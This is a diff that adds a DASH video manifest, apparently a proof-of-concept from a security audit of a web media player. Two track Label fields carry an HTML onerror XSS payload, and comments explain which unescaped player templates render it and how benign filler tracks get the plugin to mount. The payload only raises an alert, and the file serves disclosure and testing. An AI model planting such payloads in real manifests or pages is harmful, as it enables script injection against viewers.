@@ -1,0 +1,50 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<MPD xmlns="urn:mpeg:dash:schema:mpd:2011"
+     type="static"
+     mediaPresentationDuration="PT60S"
+     minBufferTime="PT2S"
+     profiles="urn:mpeg:dash:profile:isoff-live:2011">
+  <Period>
+    <!-- video (segments 404 but bug fires before any segment is loaded) -->
+    <AdaptationSet contentType="video" mimeType="video/mp4" segmentAlignment="true" startWithSAP="1">
+      <Representation id="v1" codecs="avc1.42c01e" bandwidth="900000" width="640" height="360" frameRate="30">
+        <SegmentTemplate timescale="1" media="v$Number$.m4s" initialization="vinit.mp4" startNumber="1" duration="6"/>
+      </Representation>
+    </AdaptationSet>
+
+    <!-- audio 1 - XSS in <Label> reaches `<%= track.label %>` in audio-tracks/template.ejs -->
+    <AdaptationSet contentType="audio" mimeType="audio/mp4" lang="en" segmentAlignment="true">
+      <Label><![CDATA[<img src=x onerror=alert(document.domain)>]]></Label>
+      <Representation id="a1" codecs="mp4a.40.2" bandwidth="128000" audioSamplingRate="48000">
+        <AudioChannelConfiguration schemeIdUri="urn:mpeg:dash:23003:3:audio_channel_configuration:2011" value="2"/>
+        <SegmentTemplate timescale="1" media="a$Number$.m4s" initialization="ainit.mp4" startNumber="1" duration="6"/>
+      </Representation>
+    </AdaptationSet>
+
+    <!-- audio 2 - benign filler so AudioTracks plugin passes its length>1 mount gate -->
+    <AdaptationSet contentType="audio" mimeType="audio/mp4" lang="es" segmentAlignment="true">
+      <Label>alt</Label>
+      <Representation id="a2" codecs="mp4a.40.2" bandwidth="128000" audioSamplingRate="48000">
+        <AudioChannelConfiguration schemeIdUri="urn:mpeg:dash:23003:3:audio_channel_configuration:2011" value="2"/>
+        <SegmentTemplate timescale="1" media="a2$Number$.m4s" initialization="a2init.mp4" startNumber="1" duration="6"/>
+      </Representation>
+    </AdaptationSet>
+
+    <!-- subtitle 1 - XSS in <Label> reaches `<%= t.name %>` in cc/combobox.ejs.
+         Also points at an external WebVTT whose cue text re-fires finding 2.2. -->
+    <AdaptationSet contentType="text" mimeType="text/vtt" lang="en">
+      <Label><![CDATA[<img src=x onerror=alert(document.domain)>]]></Label>
+      <Representation id="s1" bandwidth="1000">
+        <BaseURL>subs.vtt</BaseURL>
+      </Representation>
+    </AdaptationSet>
+
+    <!-- subtitle 2 - benign filler -->
+    <AdaptationSet contentType="text" mimeType="text/vtt" lang="es">
+      <Label>alt</Label>
+      <Representation id="s2" bandwidth="1000">
+        <BaseURL>subs.vtt</BaseURL>
+      </Representation>
+    </AdaptationSet>
+  </Period>
+</MPD>
